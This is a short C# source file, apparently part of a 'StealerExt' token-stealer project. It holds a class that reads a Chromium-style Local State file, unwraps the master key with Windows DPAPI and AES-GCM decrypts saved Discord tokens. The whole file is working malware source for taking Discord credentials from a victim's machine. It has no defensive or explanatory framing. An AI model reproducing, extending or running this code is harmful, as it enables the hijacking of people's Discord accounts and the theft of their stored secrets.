using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace StealerExt
{
    internal class DecryptDiscordToken
    {
        private static byte[] getMasterKey(string path)
        {
            dynamic jsonKey = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)jsonKey.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }
        public static string Decrypt_Token(byte[] buffer, string path)
        {
            byte[] iv = buffer.Skip(3).Take(12).ToArray();
            byte[] encrypted = buffer.Skip(15).ToArray();
            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(getMasterKey(path)), 128, iv, null);
            cipher.Init(false, parameters);
            var decryptedBytes = new byte[cipher.GetOutputSize(encrypted.Length)];
            var retLen = cipher.ProcessBytes(encrypted, 0, encrypted.Length, decryptedBytes, 0);
            cipher.DoFinal(decryptedBytes, retLen);
            return Encoding.UTF8.GetString(decryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
    }
}
